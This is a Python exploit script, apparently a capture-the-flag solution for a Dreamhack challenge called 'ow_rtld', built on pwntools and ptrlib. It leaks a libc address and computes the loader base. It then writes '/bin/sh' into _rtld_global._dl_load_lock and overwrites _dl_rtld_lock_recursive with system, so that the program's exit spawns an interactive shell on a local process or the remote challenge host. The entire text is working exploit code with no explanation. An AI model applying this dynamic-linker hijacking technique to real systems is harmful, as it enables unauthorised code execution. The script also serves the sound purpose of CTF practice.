#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./ow_rtld_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-2.27.so")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 23959)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    io.recvuntil(b"stdout: ")
    libc.base = int(io.recvline().strip(b"\n"), 16) - unwrap(
        libc.symbol("_IO_2_1_stdout_")
    )
    # ld.base = libc.base + 0x400000
    ld.base = libc.base + 0x3F1000
    rtld_global = unwrap(ld.symbol("_rtld_global"))
    _dl_rtld_lock_recursive = rtld_global + 3840
    _dl_load_lock = rtld_global + 2312
    ptr.logger.info(f"&_rtld_global: {hex(rtld_global)}")
    ptr.logger.info(
        f"&_rtld_global._dl_rtld_lock_recursive: {hex(_dl_rtld_lock_recursive)}"
    )
    ptr.logger.info(f"&_rtld_global._dl_load_lock: {hex(_dl_load_lock)}")

    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"addr: ", str(_dl_load_lock).encode())
    io.sendlineafter(b"data: ", str(ptr.u64(b"/bin/sh")))

    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"addr: ", str(_dl_rtld_lock_recursive).encode())
    io.sendlineafter(b"data: ", str(unwrap(libc.symbol("system"))))

    io.sendlineafter(b"> ", b"0")

    io.interactive()
    return


if __name__ == "__main__":
    main()
